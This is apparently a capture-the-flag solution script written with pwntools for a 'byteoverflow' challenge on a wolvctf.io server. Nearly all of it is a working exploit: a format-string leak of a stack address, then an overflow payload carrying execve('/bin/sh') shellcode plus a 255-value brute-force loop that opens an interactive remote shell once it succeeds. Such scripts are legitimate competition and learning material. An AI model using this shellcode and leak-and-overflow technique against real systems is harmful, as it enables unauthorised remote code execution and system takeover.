from pwn import *

elf = ELF('./byteoverflow', checksec=False)
context.arch = 'amd64'
packu = make_packer('all')



for i in range(0, 255):
    p = remote('byteoverflow.wolvctf.io', 1337)

    p.recvuntil(b"EXIT\n\n")
    p.sendline(b"2")


    p.sendlineafter(b"below: \n\n", b"%%%i$p" % 14)
    p.recvuntil(b"following: \n")
    leak = int(p.recvline().strip(),0) -80

    print(b"addr 0x%hx" % (leak))


    p.recvuntil(b"EXIT\n\n")

    p.sendline(b"1")


    payload = b"jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"
    payload += p64(leak)*26
    payload += packu(i)

    p.recvuntil(b"Mode\n\n")
    p.sendline(payload)

    p.clean()
    try:
        p.sendline('echo miaou')
        if b"miaou" in p.recvline():
            p.interactive()
    except:
        continue
